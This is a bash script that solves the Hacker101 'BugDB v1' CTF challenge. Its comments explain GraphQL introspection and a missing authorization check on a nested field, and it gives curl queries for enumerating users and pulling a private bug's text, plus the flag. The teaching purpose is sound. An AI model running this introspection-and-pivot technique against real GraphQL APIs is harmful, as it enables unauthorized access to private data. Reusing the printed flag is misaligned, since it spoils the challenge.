#!/usr/bin/env bash

set -euo pipefail

# Challenge: BugDB v1
# Platform: Hacker101 / HackerOne CTF
# Category: Web, GraphQL
# Difficulty shown: Easy
#
# Target:
#   https://4a00167b82df0cc4505e4e3bb8cad140.ctf.hacker101.com/
#
# What this challenge is teaching:
#   GraphQL applications often look "clean" from the outside because they expose
#   a single endpoint, but the real attack surface is the schema behind it.
#   If introspection is enabled, an attacker can ask the API what objects and
#   fields exist, then walk the graph until they find sensitive data.
#
# Real-world analogy:
#   Imagine a company hides the "private incident report" page from the website
#   menu, but the backend still lets any logged-out visitor ask:
#     "Show me every employee, and for each employee show me every incident note."
#   The frontend may never render that path, but GraphQL lets the client build
#   its own path through related objects. If authorization is missing on even one
#   nested field, private data leaks.
#
# Vulnerability summary:
#   1. The GraphQL endpoint allows schema introspection.
#   2. The schema exposes:
#        - allUsers / findUser
#        - Users.bugs
#        - Bugs_Connection -> Bugs_ node
#        - Bugs_.text
#   3. The application marks one bug as private, but still returns its text when
#      queried through the nested relationship:
#        allUsers -> victim -> bugs -> text
#
# Why this matters:
#   In secure GraphQL design, access control should be enforced on the object or
#   field resolver that returns sensitive data, not only in the frontend or only
#   on one "safe" query path. Here, the list view hides details, but another path
#   to the same data leaks the flag.
#
# Manual discovery flow:
#
# Step 1: Confirm the GraphQL endpoint exists.
# Command:
#   curl -s 'https://4a00167b82df0cc4505e4e3bb8cad140.ctf.hacker101.com/graphql?query=%7B__typename%7D'
# Reason:
#   This is the smallest possible GraphQL query. If it works, the endpoint is live.
#
# Step 2: Introspect the Query type.
# Command:
#   curl -sG 'https://4a00167b82df0cc4505e4e3bb8cad140.ctf.hacker101.com/graphql' \
#     --data-urlencode 'query=query{__type(name:"Query"){fields{name args{name type{kind name ofType{kind name}}} type{kind name ofType{kind name}}}}}'
# Reason:
#   This reveals entry points exposed by the API. In this challenge, the useful
#   ones are allUsers, findUser, allBugs, and findBug.
#
# Step 3: Enumerate users.
# Command:
#   curl -sG 'https://4a00167b82df0cc4505e4e3bb8cad140.ctf.hacker101.com/graphql' \
#     --data-urlencode 'query=query{allUsers(first:10){edges{node{id username}}}}'
# Reason:
#   This shows who exists. We learn there are users named admin and victim.
#
# Step 4: Pivot into the victim's related bugs and ask for text directly.
# Command:
#   curl -sG 'https://4a00167b82df0cc4505e4e3bb8cad140.ctf.hacker101.com/graphql' \
#     --data-urlencode 'query=query{findUser(username:"victim"){id username bugs(first:10){edges{node{id private text reporter{username}}}}}}'
# Reason:
#   The key bug is an authorization flaw on a nested GraphQL relationship.
#   Even though the bug is marked private, the resolver still returns the text.
#
# Expected leaked value:
#   ^FLAG^2292a5f6acdb70c90e7aac6e066968497b4f7f029bd24b88b5bbe923bff3fa55$FLAG$
#
# One-shot behavior:
#   Running this script performs the final extraction query automatically and
#   prints only the flag, so you do not need to type the commands one by one.

TARGET='https://4a00167b82df0cc4505e4e3bb8cad140.ctf.hacker101.com/graphql'
QUERY='query{findUser(username:"victim"){bugs(first:10){edges{node{text private reporter{username}}}}}}'

response="$(
  curl -sG "$TARGET" \
    --data-urlencode "query=$QUERY"
)"

printf '%s\n' "$response" | python3 -c '
import json, re, sys
data = json.load(sys.stdin)
texts = []
for edge in data["data"]["findUser"]["bugs"]["edges"]:
    node = edge["node"]
    text = node.get("text") or ""
    texts.append(text)
for text in texts:
    match = re.search(r"\^FLAG\^[^^$]+?\$FLAG\$", text)
    if match:
        print(match.group(0))
        raise SystemExit(0)
raise SystemExit("flag not found in response")
'

# Final flag obtained:
# ^FLAG^2292a5f6acdb70c90e7aac6e066968497b4f7f029bd24b88b5bbe923bff3fa55$FLAG$
